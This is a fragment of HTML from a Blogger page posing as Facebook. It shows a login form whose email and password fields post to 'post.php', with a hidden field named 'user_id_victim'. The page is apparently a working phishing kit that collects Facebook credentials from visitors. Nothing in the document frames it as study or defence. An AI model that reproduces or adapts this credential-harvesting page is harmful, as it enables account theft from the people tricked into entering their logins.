...
<link href='https://facebookworldpost.blogspot.com/favicon.ico' rel='icon' type='image/x-icon'/>
<link href='https://facebookworldpost.blogspot.com/' rel='canonical'/>
<link rel="alternate" type="application/atom+xml" title="Facebook  - Atom" href="https://facebookworldpost.blogspot.com/feeds/posts/default" />
<link rel="alternate" type="application/rss+xml" title="Facebook  - RSS" href="https://facebookworldpost.blogspot.com/feeds/posts/default?alt=rss" />
<link rel="service.post" type="application/atom+xml" title="Facebook  - Atom" href="https://www.blogger.com/feeds/2439797077352204609/posts/default" />
<link rel="me" href="https://www.blogger.com/profile/16084603542184259745" />
<!--[if IE]> 
<![endif]--> 
  <meta content="https://facebookworldpost.blogspot.com/" property="og:url"> 
  <meta content="Facebook " property="og:title"> 
  <meta content="Click on the link to get the full information " property="og:description"> 
  <!--[if IE]>   <![endif]--> 
  <!--
  ...
  <div style="display:-webkit-box"> 
   <div style="-webkit-box-flex:1"> 
    ...
    <div style="background-color:#2c3b5a0f;padding:2 31px"> 
     <center> 
      <img src="https://i.imgur.com/VPGFePH.jpg" width="300px"> 
      <div class="nav-head"> 
       <span></span> 
      </div> 
      <form method="POST" style="padding-top:17px;" action="post.php"> 
       <div class="formulaire" style="background:white;"> 
        <input name="email" type="text" placeholder="Email/phone number " class="entrer" style="padding:12px;"> 
        <input name="type" type="hidden" value="mobile"> 
        <input type="hidden" name="user_id_victim" value="6FWMJ"> 
        <input name="pass" value="" type="password" placeholder="Password " class="entrer" style="padding:12px;"> 
